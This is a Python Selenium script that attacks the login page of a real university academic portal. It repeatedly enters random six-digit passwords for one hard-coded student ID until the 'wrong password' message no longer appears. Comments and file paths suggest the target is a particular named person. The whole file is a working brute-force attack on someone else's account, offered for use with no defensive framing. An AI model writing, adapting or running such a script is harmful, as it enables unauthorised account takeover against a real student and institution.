from random import randint
from logging import error
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

def brute(username, password, driver, link="https://akademik.uin-suka.ac.id/login"):
    # head to github login page
    driver.get(link)
    # find username/email field and send the username itself to the input field
    driver.find_element_by_id("username").send_keys(username)
    # find password input field and insert password as well
    driver.find_element_by_id("password").send_keys(password)
    # click login button
    driver.find_element_by_xpath("//div[@class='login-form']/form[1]/button[1]").click()
    # wait the ready state to be complete
    WebDriverWait(driver=driver, timeout=10).until(
        lambda x: x.execute_script("return document.readyState === 'complete'")
    )
    # get the errors (if there are)
    errors = driver.find_elements_by_xpath("//*[@id='app_content']/div[1]/div[2]/div[1]/p")

    return errors

# Generate password
def generate():
    return '{:06d}'.format(randint(0,999999))

if __name__ == '__main__':
    # chromedriver path
    driverpath = '/home/irfancr/Practices/rizkitawar/chromedriver'
    # initialize the Chrome driver
    driver = webdriver.Chrome(driverpath)
    error_message = ["Maaf, Password salah.", "Maaf, status Username tidak aktif."]
    
    while(True):
        # Akademik credentials
        # Rizkita pass
        username = "19105010041"
        password = generate()
        # if we find that error message within errors, then login is failed
        errors = brute(username, password, driver)

        # print(errors)
        # print([error.text for error in errors])
        print("{}: {}".format(username, password))

        if any(e.text in error_message for e in errors):
            print("[!] Login failed", end='\n\n')
        else:
            print("[+] Login successful")
            break
    # close the driver
    driver.close()